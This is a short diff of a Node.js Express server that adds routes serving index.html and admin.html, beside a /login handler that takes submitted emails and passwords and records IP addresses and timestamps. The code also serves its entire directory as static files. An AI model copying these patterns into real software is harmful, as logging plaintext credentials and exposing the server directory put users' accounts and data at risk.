@@ -12,11 +12,19 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname)); // Serve static files from current directory
 
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.get('/admin', (req, res) => {
+    res.sendFile(path.join(__dirname, 'admin.html'));
+});
+
 const crypto = require('crypto');
 
 // Endpoint to log login attempts
 app.post('/login', (req, res) => {
-    const { email, password } = req.body;
+     const { email, password } = req.body;
     // Get IP address
     const ip_address = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const timestamp = new Date().toISOString();
